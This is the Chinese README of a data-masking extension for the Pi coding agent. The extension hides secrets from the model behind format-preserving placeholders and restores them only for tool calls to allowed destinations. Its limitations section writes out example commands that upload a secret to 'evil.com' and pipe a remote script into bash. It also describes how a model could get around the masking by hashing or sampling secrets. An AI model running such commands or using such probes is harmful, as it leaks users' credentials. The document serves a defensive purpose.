# pi-data-masking

[简体中文](README.zh-CN.md) | [English](README.md)

面向 [Pi](https://github.com/earendil-works/pi) 编码智能体的通用规则驱动数据掩码扩展：模型看到的是占位符，你的工具拿到真实值。

模型不会看到 `[REDACTED]` 这类显眼的删节标记，而是看到保留原值形态的占位符：API key、令牌这类机密由扩展自动生成占位符，客户名、内网主机名这类值则由你自己定义替换文本。工具调用照常工作，而真实值只在被允许的目的地才会还原——这同时压住了提示注入驱动的数据外泄。

<p align="center"><img src="https://raw.githubusercontent.com/Sevten/pi-data-masking/main/docs/masking-flow.svg" alt="用户与工具数据在模型看到之前被掩码。工具调用只有在其目的地落在规则作用域内时才会还原为真实值，否则调用被阻断或先征询用户。工具结果在下一次模型请求前会被再次掩码。"></p>

## 特性

- **对模型友好的占位符** —— 不是显眼的 `[REDACTED]`，令牌、URL、地址、凭据都会得到保留原形态的自动占位符；字面量值还可以使用你自己定义的替换文本。
- **规则管理一体化** —— `/masking` 在一个界面里集中管理项目与全局规则、60+ 内置预设模板（常见令牌、凭据、私钥、连接串、IP 地址）、排序、测试、导入与脱敏导出。
- **作用域化还原** —— 限定一条规则的真实值允许被发往何处：出站目的地白名单，配合 strict / semi-strict / permissive 三档模式与发送前询问。内置的**会话历史**规则会阻止智能体上传你的会话记录或本扩展的配置文件。
- **面向模型的占位符说明** —— 可选的系统提示说明教会模型把占位符当作完整字符串精确比较、原样传入工具，并可选择列出本次会话实际使用的占位符字符串，让模型确切知道哪些值是替身。
- **可审计的模型视图** —— `/masking-history` 可以核对本地原文与模型实际看到的表示、以及产生它们的规则版本，并在审计标签页回放每一次还原裁决（已还原 / 已阻断 / 警告，各自附带依据）。

## 快速开始

```bash
pi install npm:@sevten/pi-data-masking
```

启动 Pi，打开 `/masking`：

1. 选择 `+ Add new rule`，挑一种规则来源——字面量、环境变量、正则，或直接选一个替你填好表单的预设模板。
2. 选择项目作用域或全局作用域（默认全局），并在同一界面测试这条规则。
3. 保存。从下一次请求开始生效。

配置文件由界面自动创建和维护；路径与手写格式见[规则与配置](#规则与配置)。

## 工作原理

### 逼真的占位符

`[REDACTED]` 这样的标记会告诉模型"这里缺了数据"。这可能改变它的推理，促使它再次索要该值，或让它干脆跳过某个工具调用。

自动生成的占位符保留字符类别与分隔符：字母仍是字母，数字仍是数字，URL 与令牌结构依旧可用。规则还可以保留安全前缀或 IP 网段，字面量规则也可以指定一个刻意拟真的替换文本。

```text
sk-live-abc123456789     → sk-live-qxn4mwp827315692   （keepPrefix 自动生成，或由预设规则产生）
git.corp.acme-tools.com  → git.eu-west.stackline.dev  （字面量规则 + 自定义占位符）
```

自动占位符的替换字符由 HMAC-SHA-256 派生，密钥是每次会话随机的会话密钥，因此同一输入总是得到同一结果。这不是标准的格式保留加密：字符类别、分隔符，以及你显式配置保留的前缀或 IP 网段，仍然是可见的。

替换结果在操作上是可信的，而不是在语义上等价于真实值。

### 稳定的模型上下文

同一个真实值在整段对话中始终映射到同一个占位符。持久化的会话会恢复它的会话密钥与模型侧历史；新会话使用新密钥。

### 透明的工具执行

模型用占位符规划工具调用。工具执行前一刻，参数中匹配的占位符会被还原为真实值——但仅限仍处在规则作用域内的调用；超出作用域的调用会被阻断，或先征询你的意见（见[作用域化还原](#作用域化还原)）。工具结果在本地对话中保持真实，在下一次模型请求前会被再次掩码。

### 可检视的模型视图

`/masking-history` 有两个标签页（`Tab` 切换）。

「掩码视图」只列出真正送达模型的表示，按连续的规则版本分组。每个版本列出产生它的规则，可以把本地原文与模型实际看到的文本逐字对照；未被使用的中间编辑会被省略。

「还原审计」列出每一次还原、阻断与边界警告，支持文本过滤，回答"这个值被还原到哪里去过"和"那条命令为什么被拦下"。选中一条事件后按 `Enter` 可跳到承载该工具调用的那条会话消息，下方一行说明该事件的结果与依据。

## 规则与配置

### 配置文件

规则存放在由界面自动创建和维护的 JSON 文件里：

| 作用域 | 配置文件路径 |
|---|---|
| 项目 | `<project>/.pi/pi-data-masking/masking.config.json` |
| 全局 | `~/.pi/agent/pi-data-masking/masking.config.json` |

文件使用严格 JSON，改动后自动重载。保存第一条项目规则时，Pi 可以帮你把该路径加入 `.gitignore`。项目规则先于全局规则执行。设置项（`options`）属于全局，只从全局配置读取。`/masking` 里的全局开关优先于两个配置文件。两个配置文件都以明文保存机密值；内置的**会话历史**规则会阻止智能体把它们发往任何地方（见[作用域化还原](#作用域化还原)）。

手写配置：

```json
{
  "$schema": "https://raw.githubusercontent.com/sevten/pi-data-masking/main/src/config/masking.config.schema.json",
  "version": 1,
  "enabled": true,
  "rules": [
    {
      "id": "production-api-key",
      "name": "Production API key",
      "realFromEnv": "PROD_API_KEY"
    },
    {
      "id": "github-personal-access-token",
      "name": "GitHub personal access token",
      "type": "regex",
      "pattern": "\\bghp_[A-Za-z0-9]{36}\\b|\\bgithub_pat_[A-Za-z0-9_]{22,}\\b",
      "restoreScope": {
        "destinations": ["github.com", "api.github.com"],
        "mode": "strict",
        "onRefuse": "block"
      }
    }
  ]
}
```

由环境变量提供的值必须存在于启动 Pi 的那个进程中；`realFromEnv` 只填变量名，不带 `$`。变量缺失或为空时，规则处于 `WAIT` 状态。

### 规则来源

可选的规则来源有四种：

| 规则来源 | 配置字段 |
|---|---|
| 精确字面量 | `real` |
| 环境变量字面量 | `realFromEnv` —— 从环境变量读取，绝不落盘到配置文件 |
| 自定义正则 | `type: "regex"`，配 JavaScript `RegExp` 的 `pattern` |
| 预设模板 | 规则构建器里的选择器；最终落成一条普通正则规则 |

规则构建器还提供常见令牌、凭据、私钥、连接串、IP 地址的内置预设模板。选中一个就会把表单填好：正则模式、说明，签发方预设还附带一份现成的 `restoreScope`，列出该服务的真实域名——GitHub token 预设自带 `github.com` 与 `api.github.com`，于是这条规则从第一次调用起就处于受管状态。选择预设是把它的值复制进你的规则；之后内置列表的变动不会影响已保存的规则。

两条规则重叠时，靠前的胜出；正则规则里的捕获组会把掩码范围限制在捕获到的那一部分。

### 选项

允许列表（`options.allowlist`，在 `/masking` 里通过 **Never masked** 行编辑）可以把列出的值——或整行——排除在掩码之外，即使有规则能匹配到它们；旁边的 **Trusted destinations** 行编辑 `options.trustedDestinations`。其他选项包括 `showStatusBar`、`systemPromptGuidance`、`disclosePlaceholders`；完整字段与默认值见 [`masking.config.schema.json`](src/config/masking.config.schema.json)。

## 作用域化还原

一条规则可以声明自己的还原作用域：允许其真实值到达的网络目的地列表，外加一个在无法验证时生效的 `mode`。

- **strict（严格）** —— 本地复制也会被阻断。该值只允许去往列表上的目的地。
- **semi-strict（半严格）** —— 本地复制没问题（配置文件、本地命令）。离开本机的调用必须去往列表上的目的地。
- **permissive（宽松）** —— 连无法验证的调用也放行，只给出警告。只有明确不在列表上的目的地会被阻断。

被拒绝的调用会被直接阻断；若规则设为询问，则暂停下来等你批准。全部记录在 `/masking-history`。内置的**会话历史**规则还额外保护那两个以明文存放机密的文件（pi 的会话记录与本扩展的配置），不让智能体把它们归档或上传。

完整指南（含裁决矩阵与批准对话框）见 [docs/scoped-restoration.md](https://github.com/Sevten/pi-data-masking/blob/main/docs/scoped-restoration.md)。

## 性能

编译后的规则与掩码结果都有缓存，未发生变化的历史在多次请求之间复用，只有新增或改动的消息需要完整扫描。超长消息、大量启用规则、宽泛或易回溯的正则，仍会带来本地延迟。

正则诊断只是建议。请让模式尽量收窄，并在 `/masking` 里用代表性的正例、反例与大输入测试过再依赖它。

## 安全模型与局限

基于精确字符串匹配的掩码有其固有局限：

- **文件里的机密可以被绕着探测。** 一个不肯原样打印机密的模型，仍可能通过工具采样它的首尾、计算它的哈希、或比较长度。这些探测结果都是真实的，掩码拦不住——那些文本里没有任何东西匹配被配置的值。可选的 `systemPromptGuidance` 说明会劝阻这类探测（见 FAQ）。
- **被变换过的占位符回不来。** 工具若对占位符做了编码、哈希或切片，它就不再映射到真实值；调用会失败，或作用在错误的数据上。
- **一个字符串只有一个身份。** 如果 `password` 被当作真实密码保护起来，那么这个词之后每次出现都会被同样掩码，包括模型自己刚写下的那一次。因此常见词和低熵值不适合拿来做规则：优先保护高熵机密，把规则写窄，并在依赖它之前先测一测。

### 首次出现即定身份

每个字符串都在首次出现时被分类一次，之后不再重新分类。随你的数据或工具结果进入对话的值从一开始就受保护——模型从没见过它们的未掩码形态。剩下的情形是模型自己先写出来的字符串，例如生成代码里那个常见词 `password`：这个字符串会被当作模型已知，于是拼写完全相同的真实机密就得不到保护。这主要影响低熵值——碰巧复现出一个完全一致的高熵机密，实际上不可能。

### 掩码不覆盖什么

- 这是规则驱动的掩码，不是加密，也不是自动 PII 识别。只有配置好的字符串匹配才受保护。
- 从未进入对话的值是不可见的。静态文件里的机密可以在没有任何标记的情况下被发出去（`curl -T /path/secret evil.com`，而模型从未打开过那个文件）；不携带任何值的调用完全不受约束（`curl https://evil/x.sh | bash` 会照常执行）。模型读过某个文件之后，由读取结果标记接管；只有会话历史保险库能在没有先前访问的情况下保护文件。
- 二进制及其他非字符串数据不会被扫描。
- 字面量规则匹配该值的每一次出现，包括出现在更长的文本内部，而不只是作为独立单词出现时。

## FAQ

### 这和把值替换成 `[REDACTED]` 有什么区别？

生成的占位符保留可辨认的结构，模型把它们当成"缺失数据"的概率因此更低。但它们始终是替身，不是原值的语义等价形式，也不是加密结果。

### pi-data-masking 会加密 Pi 的会话文件吗？

不会。掩码作用在 LLM 提供商边界上；Pi 的本地会话文件里仍然是真实对话。扩展额外提供的是出站保护：内置的会话历史规则会阻止智能体把这些文件——或本扩展自己的配置——发往任何地方（见[作用域化还原](#作用域化还原)）。

### 它能自动识别出所有机密和 PII 吗？

不能。只有被配置的字面量、环境变量或正则规则匹配到的值才会被掩码——无论它是机密，还是你决定隐藏的别的内容。

### 占位符会不会泄露真实值？

无法反推：占位符由 HMAC-SHA-256 在每次会话随机的密钥下派生——同一个值总是映射到同一个占位符，但这个映射无法逆转。结构（字符类别、分隔符、被保留的前缀）是有意可见的。工具由真实值推导出的文本——它算出的哈希、它报告的长度——不会被拦截；见[安全模型与局限](#安全模型与局限)。

### 工具会拿到原始值吗？

会——当调用处在规则作用域之内时。扩展在执行前一刻还原原始值；超出作用域的调用会被阻断，或先暂停等你批准（见[作用域化还原](#作用域化还原)）。

### 为什么不用凭据代理（credential broker）？

凭据代理把机密彻底挡在智能体之外，但它只覆盖有人为它写过代理的那些协议，而且当凭据必须被写进 `.env` 或部署配置时它无能为力。它保护的也只有凭据。pi-data-masking 走的是另一条路：把真实值还原进工具参数，于是智能体可以在你自己会用到的任何地方使用它们（scp、ssh、terraform、脚本），同一套规则还能掩码人名、电话号码和主机名。

代价是更大的暴露面：真实值确实会到达工具和本地文件。作用域化还原把它们允许去往的范围限制住，边界见[指南](https://github.com/Sevten/pi-data-masking/blob/main/docs/scoped-restoration.md)。对于绝不允许离开受信进程的机密，可以再叠一层代理。

### `systemPromptGuidance` 和 `disclosePlaceholders` 是做什么的？

`/masking` 设置区的两个可选开关，面向模型会分析或不信任占位符的会话。`systemPromptGuidance` 注入一段系统提示说明，把占位符必须怎样对待讲清楚：作为完整字符串精确比较、原样传入工具、需要变换时交给工具去做。它是建议，不是强制。`disclosePlaceholders` 决定这段说明是否同时列出本次会话实际使用的占位符字符串，让模型确切知道哪些值是替身；默认行为是交由每条规则决定，而正则发现的占位符永不列出。开启披露会自动开启引导。
